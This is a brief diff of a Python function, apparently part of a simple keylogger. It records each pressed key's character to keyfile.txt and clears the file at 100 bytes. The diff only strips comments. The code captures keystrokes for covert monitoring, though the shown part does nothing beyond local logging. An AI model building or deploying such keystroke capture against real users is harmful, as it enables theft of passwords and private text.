@@ -4,15 +4,12 @@ import os
 def keypressed(key):
     max_size = 100  # Maximum file size in bytes (e.g., 100 bytes)
 
-    # Check the size of the file
     if os.path.exists("keyfile.txt"):
         if os.path.getsize("keyfile.txt") >= max_size:
-            # Erase the file's content if it exceeds the max size
             with open("keyfile.txt", "w") as f:
-                f.truncate(0)  # This clears the file content
+                f.truncate(0)  
             print("File size limit reached. Data cleared.")
 
-    # Proceed to write new data to the file
     with open("keyfile.txt", "a") as f:
         try:
             char = key.char
